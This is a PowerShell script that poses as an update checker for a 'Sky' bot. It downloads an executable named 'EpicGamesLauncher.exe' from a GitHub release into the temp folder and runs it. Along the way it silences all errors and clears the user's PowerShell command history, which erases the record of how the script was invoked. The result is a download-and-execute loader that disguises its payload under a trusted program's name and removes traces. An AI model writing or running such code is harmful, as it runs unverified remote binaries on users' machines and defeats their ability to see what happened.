$ErrorActionPreference = "SilentlyContinue"

# ==========================================
# 🌟 บังคับให้ PowerShell แสดงผลข้อความ UTF-8 (ภาษาไทยจาก GitHub จะได้ไม่เป็นกล่อง)
# ==========================================
[console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ==========================================
# 🌟 บังคับใช้ TLS 1.2 สำหรับเชื่อมต่อ GitHub
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "Checking for updates (Sky)..." -ForegroundColor Cyan

$apiUrl = "https://api.github.com/repos/GRILLYje/Animal_Sky_Public/releases/latest"

try {
    $releaseInfo = Invoke-RestMethod -Uri $apiUrl -Method Get
    
    $version = $releaseInfo.tag_name
    $publishedAt = [datetime]$releaseInfo.published_at
    $localTime = $publishedAt.ToLocalTime().ToString("dd/MM/yyyy HH:mm:ss")
    $description = $releaseInfo.body

    $downloadUrl = ($releaseInfo.assets | Where-Object { $_.name -eq "EpicGamesLauncher.exe" }).browser_download_url

    if (-not $downloadUrl) {
        Write-Host "⚠️ Error: Could not find 'EpicGamesLauncher.exe' in the latest release!" -ForegroundColor Red
        Exit
    }

    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host "🌟 New Update Available!" -ForegroundColor Green
    Write-Host "📌 Version: $version" -ForegroundColor White
    Write-Host "🕒 Date & Time: $localTime" -ForegroundColor White
    Write-Host "📝 Release Notes:" -ForegroundColor Cyan
    Write-Host "$description" -ForegroundColor Gray
    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host "Downloading file... Please wait." -ForegroundColor White

} catch {
    Write-Host "⚠️ Failed to fetch update info from GitHub." -ForegroundColor Red
    Write-Host "API Error: $($_.Exception.Message)" -ForegroundColor Yellow
    Exit
}

$folderPath = "$env:TEMP\Sky"
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

$tempPath = "$folderPath\EpicGamesLauncher.exe"

# ลองลบไฟล์เก่าดูก่อน ถ้าลบไม่ได้แปลว่าเปิดค้างอยู่
try {
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction Stop
    }
} catch {
    Write-Host "❌ Error: Cannot delete old file. Please make sure the bot is closed." -ForegroundColor Red
    Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Yellow
    Exit
}

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    $webClient.Dispose()
    Write-Host "✅ Download Complete!" -ForegroundColor Green
} catch {
    Write-Host "❌ Error downloading the file." -ForegroundColor Red
    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
    Exit
}

try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) { Clear-Content -Path $historyPath }
    Clear-History
} catch {}

Write-Host "🚀 Launching Sky..." -ForegroundColor Green
Start-Process -FilePath $tempPath
